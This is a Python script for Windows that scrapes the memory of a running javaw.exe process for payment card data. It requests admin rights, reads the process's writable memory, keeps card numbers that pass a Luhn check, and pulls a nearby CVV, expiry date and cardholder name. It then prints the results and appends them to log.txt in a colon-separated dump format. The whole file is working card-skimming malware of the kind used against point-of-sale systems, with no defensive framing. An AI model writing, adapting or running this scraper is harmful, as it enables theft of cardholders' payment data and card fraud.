import ctypes
import psutil
import re
import threading
from queue import Queue
import sys

# Constants for process access
PROCESS_VM_READ = 0x0010
PROCESS_QUERY_INFORMATION = 0x0400

# Queue for memory regions to scan (for threading)
memory_queue = Queue()

# Luhn's algorithm to validate credit card numbers
def validate_luhn(card_number):
    total = 0
    reverse_digits = card_number[::-1]
    for i, digit in enumerate(reverse_digits):
        n = int(digit)
        if i % 2 == 1:
            n *= 2
            if n > 9:
                n -= 9
        total += n
    return total % 10 == 0

# Expanded regex patterns
cc_regex = re.compile(r'(\b(?:\d[ -]*?){13,19}\b)')  # Credit card number
cvv_regex = re.compile(r'\b\d{3,4}\b')  # CVV code (3 or 4 digits)
expiry_regex = re.compile(r'\b(0[1-9]|1[0-2])/(?:[0-9]{2}|[0-9]{4})\b')  # Expiry date MM/YY or MM/YYYY
name_regex = re.compile(r'\b[A-Z][a-z]+ [A-Z][a-z]+\b')  # Simple name pattern (First Last)

# Log file
log_file = "log.txt"

# Scan a buffer for potential credit card data
def scan_memory_chunk(memory_chunk):
    results = []

    card_matches = cc_regex.findall(memory_chunk)
    for card_match in card_matches:
        sanitized_card = re.sub(r'[^\d]', '', card_match)  # Remove non-numeric characters

        if validate_luhn(sanitized_card):
            # Try to find associated CVV, expiry date, and name near the card
            match_index = memory_chunk.find(card_match)
            surrounding_text = memory_chunk[max(0, match_index - 200): match_index + 400]  # Extended search range

            # Find possible CVV, expiry date, and name nearby
            cvv_match = cvv_regex.findall(surrounding_text)
            expiry_match = expiry_regex.findall(surrounding_text)
            name_matches = name_regex.findall(surrounding_text)

            # Use the first matches found
            cvv = cvv_match[0] if cvv_match else 'Not Found'
            expiry = expiry_match[0] if expiry_match else 'Not Found'
            name = name_matches[0] if name_matches else 'Not Found'

            card_info = {
                'Card Number': sanitized_card,
                'CVV': cvv,
                'Expiry Date': expiry,
                'Name': name
            }
            results.append(card_info)

    return results

# Worker thread that processes memory chunks
def memory_scan_worker(process_handle):
    while not memory_queue.empty():
        base_addr, size = memory_queue.get()
        try:
            buffer = ctypes.create_string_buffer(size)
            bytesRead = ctypes.c_size_t(0)
            if ctypes.windll.kernel32.ReadProcessMemory(process_handle, ctypes.c_void_p(base_addr), buffer, size, ctypes.byref(bytesRead)):
                valid_cards = scan_memory_chunk(buffer.raw.decode('latin-1', errors='ignore'))
                if valid_cards:
                    for card in valid_cards:
                        # Format the output as requested
                        formatted_output = f"{card['Card Number']}:{card['Name']}:{card['CVV']}:{card['Expiry Date']}"
                        print(formatted_output)
                        
                        # Log to file
                        with open(log_file, 'a') as f:
                            f.write(formatted_output + '\n')
        except Exception as e:
            print(f"Error reading memory at {base_addr}: {e}")
        finally:
            memory_queue.task_done()

# Define the MEMORY_BASIC_INFORMATION structure
class MEMORY_BASIC_INFORMATION(ctypes.Structure):
    _fields_ = [
        ("BaseAddress", ctypes.c_void_p),
        ("AllocationBase", ctypes.c_void_p),
        ("AllocationProtect", ctypes.c_ulong),
        ("RegionSize", ctypes.c_size_t),
        ("State", ctypes.c_ulong),
        ("Protect", ctypes.c_ulong),
        ("Type", ctypes.c_ulong)
    ]

# Get memory regions to scan (only committed, readable regions)
def get_memory_regions(pid):
    process = psutil.Process(pid)
    with process.oneshot():
        handle = ctypes.windll.kernel32.OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, False, pid)
        if not handle:
            raise Exception(f"Failed to open process {pid}")

        memory_regions = []
        address = 0
        mbi = MEMORY_BASIC_INFORMATION()

        while ctypes.windll.kernel32.VirtualQueryEx(handle, ctypes.c_void_p(address), ctypes.byref(mbi), ctypes.sizeof(mbi)):
            if mbi.State == 0x1000 and mbi.Protect == 0x04:  # MEM_COMMIT and PAGE_READWRITE
                memory_regions.append((mbi.BaseAddress, mbi.RegionSize))
            address += mbi.RegionSize

        ctypes.windll.kernel32.CloseHandle(handle)
        return memory_regions

# Main function to scan memory of target process
def scan_process_memory(pid, num_threads=4):
    memory_regions = get_memory_regions(pid)
    if not memory_regions:
        print(f"No valid memory regions found for PID {pid}")
        return

    for region in memory_regions:
        memory_queue.put(region)

    process_handle = ctypes.windll.kernel32.OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, False, pid)

    threads = []
    for _ in range(num_threads):
        t = threading.Thread(target=memory_scan_worker, args=(process_handle,))
        t.start()
        threads.append(t)

    memory_queue.join()

    for t in threads:
        t.join()
    ctypes.windll.kernel32.CloseHandle(process_handle)

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

if __name__ == "__main__":
    if not is_admin():
        print("Attempting to restart with admin privileges...")
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        sys.exit(0)

    for proc in psutil.process_iter(['pid', 'name']):
        if proc.info['name'] == 'javaw.exe':
            target_pid = proc.info['pid']
            print(f"Found javaw.exe with PID {target_pid}")
            scan_process_memory(target_pid)
            break
    else:
        print("javaw.exe not found!")
